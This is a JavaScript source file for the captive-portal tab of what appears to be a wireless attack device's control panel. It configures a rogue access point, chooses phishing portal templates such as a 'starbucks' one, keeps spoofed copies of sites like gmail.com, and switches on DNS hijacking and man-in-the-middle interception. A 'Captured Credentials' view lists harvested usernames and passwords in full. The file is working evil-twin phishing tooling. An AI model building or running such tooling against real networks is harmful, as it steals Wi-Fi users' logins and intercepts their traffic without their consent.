/* ========================================
   Captive Portal Tab
   Full control of the captive portal panel:
   - state toggle + live status
   - config editor (SSID / AP / pass / toggles)
   - cached hosts viewer with per-host delete, upload, browse
   - portal template browser + upload
   - credentials viewer + individual download/delete
   ======================================== */
'use strict';

var CaptiveTab = {
    init() {
        var panel = document.getElementById('tab-captive');
        panel.innerHTML =
            '<div class="grid grid-cols-2">' +
              this.statusCard() +
              this.configCard() +
              this.templatesCard() +
              this.cacheCard() +
              this.credsCard() +
              this.clientsCard() +
            '</div>';
        this.bindEvents();
    },

    statusCard() {
        return '' +
            '<div class="card card-accent">' +
              '<h3>Status</h3>' +
              '<div class="kv"><span>State</span><span id="cap-state" class="bad">STOPPED</span></div>' +
              '<div class="kv"><span>Clients</span><span id="cap-clients">0</span></div>' +
              '<div class="kv"><span>Credentials</span><span id="cap-creds">0</span></div>' +
              '<div class="kv"><span>Cached sites</span><span id="cap-cache">0</span></div>' +
              '<div class="kv"><span>Intercept</span><span id="cap-intercept">off</span></div>' +
              '<div class="kv"><span>Internet</span><span id="cap-net">allowed</span></div>' +
              '<div class="btn-row" style="margin-top:12px">' +
                '<button id="cap-start" class="btn btn-gold">Start</button>' +
                '<button id="cap-stop" class="btn btn-muted">Stop</button>' +
              '</div>' +
              '<div class="btn-row" style="margin-top:6px">' +
                '<button id="cap-net-toggle" class="btn btn-muted">Toggle Internet</button>' +
              '</div>' +
            '</div>';
    },

    configCard() {
        return '' +
            '<div class="card card-accent">' +
              '<h3>Configuration</h3>' +
              '<div class="form-row"><label>SSID</label><input type="text" id="cap-ssid" /></div>' +
              '<div class="form-row"><label>Encryption</label>' +
                '<select id="cap-apmode"><option value="open">Open</option><option value="wpa">WPA2</option></select>' +
              '</div>' +
              '<div class="form-row"><label>Password</label><input type="text" id="cap-password" placeholder="(open network)" /></div>' +
              '<div class="form-row"><label>Portal template</label><select id="cap-template"></select></div>' +
              '<div class="toggle-grid">' +
                '<label><input type="checkbox" id="cap-portal"/> Portal gate</label>' +
                '<label><input type="checkbox" id="cap-spoof"/> Spoof (R/O)</label>' +
                '<label><input type="checkbox" id="cap-mitm"/> MITM (R/W)</label>' +
                '<label><input type="checkbox" id="cap-banner"/> POC banner</label>' +
                '<label><input type="checkbox" id="cap-dns"/> DNS hijack</label>' +
              '</div>' +
              '<div class="btn-row" style="margin-top:10px">' +
                '<button id="cap-save" class="btn btn-gold">Save</button>' +
              '</div>' +
            '</div>';
    },

    templatesCard() {
        return '' +
            '<div class="card card-accent card-full">' +
              '<h3>Portal Templates</h3>' +
              '<div class="kv"><span>Active template</span><span id="cap-tmpl-active" class="ok">-</span></div>' +
              '<div id="cap-templates-list" class="file-list" style="margin-top:10px"></div>' +
              '<h4 style="margin-top:14px">Upload new / replace file</h4>' +
              '<div class="upload-row">' +
                '<input type="text" id="cap-tmpl-name" placeholder="template dir (e.g. starbucks)" />' +
                '<input type="text" id="cap-tmpl-file" placeholder="filename (e.g. index.html)" value="index.html" />' +
                '<input type="file" id="cap-tmpl-upload" />' +
                '<button id="cap-tmpl-btn" class="btn btn-gold btn-sm">Upload</button>' +
              '</div>' +
              '<h4 style="margin-top:14px">Inline editor</h4>' +
              '<div class="muted" id="cap-editor-hint">Click a template file above to load it here.</div>' +
              '<div id="cap-editor-wrap" style="display:none; margin-top:6px">' +
                '<div class="kv"><span>Editing</span><span id="cap-editor-path">-</span></div>' +
                '<textarea id="cap-editor" spellcheck="false" class="html-editor"></textarea>' +
                '<div class="btn-row" style="margin-top:8px">' +
                  '<button id="cap-editor-save" class="btn btn-gold btn-sm">Save</button>' +
                  '<button id="cap-editor-close" class="btn btn-muted btn-sm">Close</button>' +
                  '<button id="cap-editor-preview" class="btn btn-muted btn-sm">Open in new tab</button>' +
                '</div>' +
              '</div>' +
            '</div>';
    },

    cacheCard() {
        return '' +
            '<div class="card card-accent">' +
              '<h3>Cached Sites (Spoof Library)</h3>' +
              '<div class="btn-row" style="margin-bottom:8px">' +
                '<button id="cap-cache-refresh" class="btn btn-muted btn-sm">Refresh</button>' +
                '<button id="cap-cache-clear" class="btn btn-danger btn-sm">Clear All</button>' +
              '</div>' +
              '<div id="cap-cache-list" class="file-list"></div>' +
              '<div id="cap-cache-detail" class="file-detail"></div>' +
              '<div class="upload-row">' +
                '<input type="text" id="cap-cache-host" placeholder="host (e.g. gmail.com)" />' +
                '<input type="text" id="cap-cache-fname" placeholder="file path (e.g. index.html)" value="index.html" />' +
                '<input type="file" id="cap-cache-upload" />' +
                '<button id="cap-cache-btn" class="btn btn-gold btn-sm">Upload</button>' +
              '</div>' +
            '</div>';
    },

    credsCard() {
        return '' +
            '<div class="card card-accent">' +
              '<h3>Captured Credentials</h3>' +
              '<div class="btn-row" style="margin-bottom:8px">' +
                '<button id="cap-creds-refresh" class="btn btn-muted btn-sm">Refresh</button>' +
                '<button id="cap-creds-clear" class="btn btn-danger btn-sm">Clear All</button>' +
              '</div>' +
              '<div id="cap-creds-list" class="file-list"></div>' +
            '</div>';
    },

    clientsCard() {
        return '' +
            '<div class="card card-accent">' +
              '<h3>Associated Clients</h3>' +
              '<div id="cap-clients-list" class="file-list"></div>' +
            '</div>';
    },

    bindEvents() {
        var self = this;
        document.getElementById('cap-start').onclick = async () => {
            try { await App.post('/api/captive/start'); App.toast('Started', 'success'); }
            catch (e) { App.toast('Start failed: ' + e, 'error'); }
            self.refresh();
        };
        document.getElementById('cap-stop').onclick = async () => {
            if (!await App.confirm('Stop the captive portal?')) return;
            try { await App.post('/api/captive/stop'); App.toast('Stopped', 'success'); }
            catch (e) { App.toast('Stop failed: ' + e, 'error'); }
            self.refresh();
        };
        document.getElementById('cap-net-toggle').onclick = async () => {
            var cur = self._cfg && self._cfg.internet_allowed;
            var next = !cur;
            if (!next && !(await App.confirm('Block real internet for all br-lan clients?'))) return;
            try { await App.post('/api/captive/config', {captive_internet_allowed: next}); self.refresh(); }
            catch (e) { App.toast('Failed: ' + e, 'error'); }
        };
        document.getElementById('cap-save').onclick = () => self.saveConfig();

        document.getElementById('cap-cache-refresh').onclick = () => self.loadCache();
        document.getElementById('cap-cache-clear').onclick = async () => {
            if (!await App.confirm('Wipe entire spoof library?')) return;
            await App.post('/api/captive/clear_cache');
            App.toast('Cache cleared', 'success');
            self.loadCache();
        };
        document.getElementById('cap-cache-btn').onclick = () => self.uploadCacheFile();

        document.getElementById('cap-creds-refresh').onclick = () => self.loadCreds();
        document.getElementById('cap-creds-clear').onclick = async () => {
            if (!await App.confirm('Delete all captured credentials?')) return;
            await App.post('/api/captive/clear_creds');
            App.toast('Credentials cleared', 'success');
            self.loadCreds();
        };

        document.getElementById('cap-tmpl-btn').onclick = () => self.uploadTemplateFile();
    },

    activate() {
        this.refresh();
        this.loadCache();
        this.loadCreds();
        this.loadTemplates();
        App.startPolling('captive', () => this.refreshStatus(), 3000);
    },

    deactivate() {},

    async refresh() {
        try {
            var s = await App.api('/api/captive/state');
            this._state = s;
            this._cfg = s.config;
            this.fillStatus(s);
            this.fillForm(s.config);
        } catch (e) {}
    },

    async refreshStatus() {
        try {
            var s = await App.api('/api/captive/state');
            this._state = s;
            this._cfg = s.config;
            this.fillStatus(s);
            this.fillClients(s.clients || []);
        } catch (e) {}
    },

    fillStatus(s) {
        var st = document.getElementById('cap-state');
        st.textContent = s.running ? 'RUNNING' : 'STOPPED';
        st.className = s.running ? 'ok' : 'bad';
        document.getElementById('cap-clients').textContent = (s.clients || []).length;
        document.getElementById('cap-creds').textContent = s.cred_count;
        document.getElementById('cap-cache').textContent = s.cache_count;
        document.getElementById('cap-intercept').textContent = s.intercept_active ? 'on' : 'off';
        var ne = document.getElementById('cap-net');
        ne.textContent = s.internet_blocked ? 'BLOCKED' : 'allowed';
        ne.className = s.internet_blocked ? 'bad' : 'ok';
        this.fillClients(s.clients || []);
    },

    fillClients(clients) {
        var el = document.getElementById('cap-clients-list');
        if (!clients.length) {
            el.innerHTML = '<div class="muted">no clients connected</div>';
            return;
        }
        el.innerHTML = clients.map(function(c) {
            return '<div class="file-row">' +
                '<span class="file-name">' + App.esc(c.mac) + '</span>' +
                '<span class="file-meta">' + App.esc(c.signal || '') + '</span>' +
                '<span class="file-meta">' + App.esc(c.connected || '') + '</span>' +
            '</div>';
        }).join('');
    },

    fillForm(cfg) {
        if (!cfg) return;
        document.getElementById('cap-ssid').value = cfg.ssid || '';
        document.getElementById('cap-apmode').value = cfg.ap_open ? 'open' : 'wpa';
        document.getElementById('cap-password').value = cfg.password || '';
        document.getElementById('cap-portal').checked = !!cfg.portal_enabled;
        document.getElementById('cap-spoof').checked = !!cfg.spoof_enabled;
        document.getElementById('cap-mitm').checked = !!cfg.mitm_enabled;
        document.getElementById('cap-banner').checked = !!cfg.mirror_banner;
        document.getElementById('cap-dns').checked = !!cfg.dns_hijack;
    },

    async saveConfig() {
        var body = {
            captive_ssid: document.getElementById('cap-ssid').value.trim(),
            captive_ap_open: document.getElementById('cap-apmode').value === 'open',
            captive_password: document.getElementById('cap-password').value,
            captive_portal_enabled: document.getElementById('cap-portal').checked,
            captive_spoof_enabled: document.getElementById('cap-spoof').checked,
            captive_mitm_enabled: document.getElementById('cap-mitm').checked,
            captive_mirror_banner: document.getElementById('cap-banner').checked,
            captive_dns_hijack: document.getElementById('cap-dns').checked,
        };
        var tmpl = document.getElementById('cap-template').value;
        if (tmpl) body.captive_portal_template = tmpl;
        try {
            await App.post('/api/captive/config', body);
            App.toast('Saved', 'success');
            this.refresh();
        } catch (e) {
            App.toast('Save failed: ' + e, 'error');
        }
    },

    async loadTemplates() {
        try {
            var data = await App.api('/api/captive/templates');
            var list = data.templates || [];
            var active = (this._cfg && this._cfg.portal_template) || 'default';
            var sel = document.getElementById('cap-template');
            sel.innerHTML = list.map(function(t) {
                return '<option value="' + App.esc(t.name) + '">' + App.esc(t.name) + '</option>';
            }).join('');
            sel.value = active;
            var activeEl = document.getElementById('cap-tmpl-active');
            if (activeEl) activeEl.textContent = active;

            var el = document.getElementById('cap-templates-list');
            if (!list.length) {
                el.innerHTML = '<div class="muted">no templates</div>';
                return;
            }
            var self = this;
            el.innerHTML = list.map(function(t) {
                var isActive = t.name === active;
                var files = (t.files || []).map(function(f) {
                    var rel = t.name + '/' + f.path;
                    return '<div class="file-row file-sub tmpl-file-row" data-tmpl-edit="' + App.esc(rel) + '">' +
                        '<span class="file-name">' + App.esc(f.path) + '</span>' +
                        '<span class="file-meta">' + App.fmtBytes(f.size) + '</span>' +
                        '<button class="btn btn-gold btn-sm" data-tmpl-edit-btn="' + App.esc(rel) + '">Edit</button>' +
                        '<a class="btn btn-muted btn-sm" href="/api/captive/template/' + encodeURIComponent(rel) + '" onclick="event.stopPropagation()">Download</a>' +
                    '</div>';
                }).join('');
                var useBtn = isActive
                    ? '<span class="ok" style="margin-left:auto">ACTIVE</span>'
                    : '<button class="btn btn-gold btn-sm" data-tmpl-use="' + App.esc(t.name) + '" style="margin-left:auto">Use this</button>';
                return '<div class="tmpl-group">' +
                    '<div class="tmpl-header"><span class="tmpl-name">' + App.esc(t.name) + '</span>' + useBtn + '</div>' +
                    (files || '<div class="muted">(empty)</div>') + '</div>';
            }).join('');

            el.querySelectorAll('[data-tmpl-use]').forEach(function(btn) {
                btn.onclick = async function(ev) {
                    ev.stopPropagation();
                    var name = btn.getAttribute('data-tmpl-use');
                    try {
                        await App.post('/api/captive/config', {captive_portal_template: name});
                        App.toast('Active template: ' + name, 'success');
                        self.refresh();
                        self.loadTemplates();
                    } catch (e) { App.toast('Failed: ' + e, 'error'); }
                };
            });
            // Click anywhere on a tmpl-file-row to open the editor
            el.querySelectorAll('.tmpl-file-row').forEach(function(row) {
                row.onclick = function() {
                    self.openEditor(row.getAttribute('data-tmpl-edit'));
                };
            });
        } catch (e) {}
    },

    async openEditor(rel) {
        try {
            var resp = await fetch('/api/captive/template/' + encodeURIComponent(rel));
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            var text = await resp.text();
            document.getElementById('cap-editor-hint').style.display = 'none';
            var wrap = document.getElementById('cap-editor-wrap');
            wrap.style.display = '';
            document.getElementById('cap-editor-path').textContent = rel;
            document.getElementById('cap-editor').value = text;
            this._editorRel = rel;
            var self = this;
            document.getElementById('cap-editor-save').onclick = () => self.saveEditor();
            document.getElementById('cap-editor-close').onclick = () => self.closeEditor();
            document.getElementById('cap-editor-preview').onclick = function() {
                window.open('/api/captive/template/' + encodeURIComponent(self._editorRel), '_blank');
            };
        } catch (e) { App.toast('Open failed: ' + e, 'error'); }
    },

    closeEditor() {
        document.getElementById('cap-editor-wrap').style.display = 'none';
        document.getElementById('cap-editor-hint').style.display = '';
        this._editorRel = null;
    },

    async saveEditor() {
        if (!this._editorRel) return;
        var slash = this._editorRel.indexOf('/');
        if (slash < 0) {
            App.toast('Bad path', 'error');
            return;
        }
        var template = this._editorRel.slice(0, slash);
        var filename = this._editorRel.slice(slash + 1);
        var content = document.getElementById('cap-editor').value;
        try {
            var resp = await fetch('/api/captive/upload_portal', {
                method: 'POST',
                headers: {
                    'X-Pager-Template': template,
                    'X-Pager-Filename': filename,
                    'Content-Type': 'text/html; charset=utf-8',
                },
                body: content,
            });
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            App.toast('Saved ' + this._editorRel, 'success');
            this.loadTemplates();
        } catch (e) { App.toast('Save failed: ' + e, 'error'); }
    },

    async loadCache() {
        try {
            var data = await App.api('/api/captive/cache');
            var hosts = data.hosts || [];
            var el = document.getElementById('cap-cache-list');
            if (!hosts.length) {
                el.innerHTML = '<div class="muted">cache empty</div>';
                return;
            }
            var self = this;
            el.innerHTML = hosts.map(function(h) {
                return '<div class="file-row">' +
                    '<span class="file-name">' + App.esc(h.host) + '</span>' +
                    '<span class="file-meta">' + h.files + ' files</span>' +
                    '<span class="file-meta">' + App.fmtBytes(h.bytes) + '</span>' +
                    '<button class="btn btn-muted btn-sm" data-cache-browse="' + App.esc(h.host) + '">Browse</button>' +
                    '<button class="btn btn-danger btn-sm" data-cache-del="' + App.esc(h.host) + '">Delete</button>' +
                '</div>';
            }).join('');
            el.querySelectorAll('[data-cache-del]').forEach(function(btn) {
                btn.onclick = async function() {
                    var host = btn.getAttribute('data-cache-del');
                    if (!await App.confirm('Delete cache for ' + host + '?')) return;
                    await App.post('/api/captive/delete_cache_host', {host: host});
                    App.toast('Deleted', 'success');
                    self.loadCache();
                };
            });
            el.querySelectorAll('[data-cache-browse]').forEach(function(btn) {
                btn.onclick = function() {
                    self.browseCache(btn.getAttribute('data-cache-browse'));
                };
            });
        } catch (e) {}
    },

    async browseCache(host) {
        try {
            var data = await App.api('/api/captive/cache_tree/' + encodeURIComponent(host));
            var el = document.getElementById('cap-cache-detail');
            var files = data.files || [];
            if (!files.length) {
                el.innerHTML = '<div class="muted">host has no files</div>';
                return;
            }
            el.innerHTML = '<div class="tmpl-name">' + App.esc(host) + '</div>' +
                files.map(function(f) {
                    return '<div class="file-row file-sub">' +
                        '<span class="file-name">' + App.esc(f.path) + '</span>' +
                        '<span class="file-meta">' + App.fmtBytes(f.size) + '</span>' +
                        '<a class="btn btn-muted btn-sm" href="/api/captive/cache_file/' +
                            encodeURIComponent(host + '/' + f.path) + '">Download</a>' +
                    '</div>';
                }).join('');
        } catch (e) {}
    },

    async loadCreds() {
        try {
            var data = await App.api('/api/captive/credentials');
            var files = data.files || [];
            var entries = data.entries || [];
            var el = document.getElementById('cap-creds-list');
            if (!files.length) {
                el.innerHTML = '<div class="muted">no credentials captured yet</div>';
                return;
            }
            // files and entries are parallel (both sorted newest first)
            var self = this;
            el.innerHTML = files.map(function(f, idx) {
                var e = entries[idx] || {};
                var fields = e.fields || {};
                var host = e.host || '';
                var src = e.source || '';
                var ts = e.timestamp ? App.fmtTime(e.timestamp) : '';
                // Inline field rows — show EVERY captured field, not
                // just the first 3, and render passwords in full so
                // the user doesn't need to download the JSON to see
                // what was captured.
                var fieldRows = Object.keys(fields).map(function(k) {
                    var isPass = /pass|pwd|secret/i.test(k);
                    var valClass = isPass ? 'cred-pass' : 'cred-val';
                    return '<div class="cred-field">' +
                        '<span class="cred-key">' + App.esc(k) + '</span>' +
                        '<span class="' + valClass + '">' + App.esc(String(fields[k])) + '</span>' +
                    '</div>';
                }).join('');
                return '<div class="cred-card">' +
                    '<div class="cred-header">' +
                      '<span class="cred-host">' + App.esc(host) + '</span>' +
                      '<span class="cred-source">' + App.esc(src) + '</span>' +
                      '<span class="cred-time">' + App.esc(ts) + '</span>' +
                      '<a class="btn btn-muted btn-sm" href="/api/captive/credential/' + encodeURIComponent(f.name) + '">JSON</a>' +
                      '<button class="btn btn-danger btn-sm" data-cred-del="' + App.esc(f.name) + '">Delete</button>' +
                    '</div>' +
                    '<div class="cred-fields">' + (fieldRows || '<div class="muted">(no fields)</div>') + '</div>' +
                    '<div class="cred-file">' + App.esc(f.name) + '</div>' +
                '</div>';
            }).join('');
            el.querySelectorAll('[data-cred-del]').forEach(function(btn) {
                btn.onclick = async function() {
                    var name = btn.getAttribute('data-cred-del');
                    if (!await App.confirm('Delete ' + name + '?')) return;
                    await App.post('/api/captive/delete_credential', {name: name});
                    App.toast('Deleted', 'success');
                    self.loadCreds();
                };
            });
        } catch (e) {}
    },

    async uploadTemplateFile() {
        var name = document.getElementById('cap-tmpl-name').value.trim();
        var fname = document.getElementById('cap-tmpl-file').value.trim();
        var fileInput = document.getElementById('cap-tmpl-upload');
        if (!name || !fname || !fileInput.files[0]) {
            App.toast('Need template name, filename, and file', 'error');
            return;
        }
        var file = fileInput.files[0];
        try {
            var resp = await fetch('/api/captive/upload_portal', {
                method: 'POST',
                headers: {
                    'X-Pager-Template': name,
                    'X-Pager-Filename': fname,
                    'Content-Type': 'application/octet-stream',
                },
                body: await file.arrayBuffer(),
            });
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            App.toast('Uploaded', 'success');
            this.loadTemplates();
        } catch (e) {
            App.toast('Upload failed: ' + e, 'error');
        }
    },

    async uploadCacheFile() {
        var host = document.getElementById('cap-cache-host').value.trim();
        var fname = document.getElementById('cap-cache-fname').value.trim();
        var fileInput = document.getElementById('cap-cache-upload');
        if (!host || !fname || !fileInput.files[0]) {
            App.toast('Need host, filename, and file', 'error');
            return;
        }
        var file = fileInput.files[0];
        try {
            var resp = await fetch('/api/captive/upload_cache', {
                method: 'POST',
                headers: {
                    'X-Pager-Host': host,
                    'X-Pager-Filename': fname,
                    'Content-Type': 'application/octet-stream',
                },
                body: await file.arrayBuffer(),
            });
            if (!resp.ok) throw new Error('HTTP ' + resp.status);
            App.toast('Uploaded', 'success');
            this.loadCache();
        } catch (e) {
            App.toast('Upload failed: ' + e, 'error');
        }
    }
};

App.registerTab('captive', CaptiveTab);
